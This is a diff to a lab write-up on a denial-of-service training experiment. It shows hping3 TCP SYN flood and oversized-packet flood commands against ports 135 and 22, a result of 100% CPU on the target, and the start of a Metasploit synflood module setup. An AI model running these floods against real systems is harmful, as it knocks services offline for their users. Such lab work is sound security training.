@@ -50,11 +50,12 @@ The experiment was performed for academic and cybersecurity training purposes on
 * Recorded normal network traffic patterns using Wireshark for baseline analysis.
 
 **Step 4: Performing DoS Attack Using hping3**
+
 Two different types of flooding techniques were tested:
 - i. **TCP SYN Flood on Port 135**
   * Identified the target’s IP address, e.g., 192.168.1.105.
   * Launched a TCP SYN flood attack using hping3:
-  * ```bash
+    ```bash
     hping3 -S <victim-ip> -p 135 --flood
     ```
   * `-S` → Sends TCP packets with the SYN flag set.
@@ -65,7 +66,7 @@ Two different types of flooding techniques were tested:
  - ii. **Large Packet Flood on Port 22**
    * Identified the target’s IP address, e.g., 192.168.1.105.
    * Launched a SYN flood attack using hping3:
-   * ```bash
+     ```bash
      hping3 -d 65538 -S -p 22 --flood <victim-ip>
      ```
    * `-d 65538` → Sets a custom packet size (very large in this case, which can strain the target’s processing and bandwidth).
@@ -73,3 +74,16 @@ Two different types of flooding techniques were tested:
    * `-p 22` → Targets port 22 (commonly used for SSH).
    * `--flood` → Sends the packets continuously at maximum speed.
    * **Purpose** → This variant not only initiates a SYN flood but also uses oversized packets, increasing resource consumption and amplifying the denial-of-service effect.
+ 
+Observed **CPU usage reaching 100%** on the target machine, causing freezing and unresponsiveness.
+
+**Step 5: Performing the Attack Using Metasploit**
+
+i. Opened Metasploit console:
+   ```bash
+    msfconsole
+    ```
+ ii. Selected a DoS auxiliary module:
+```bash
+   use auxiliary/dos/tcp/synflood
+   ```
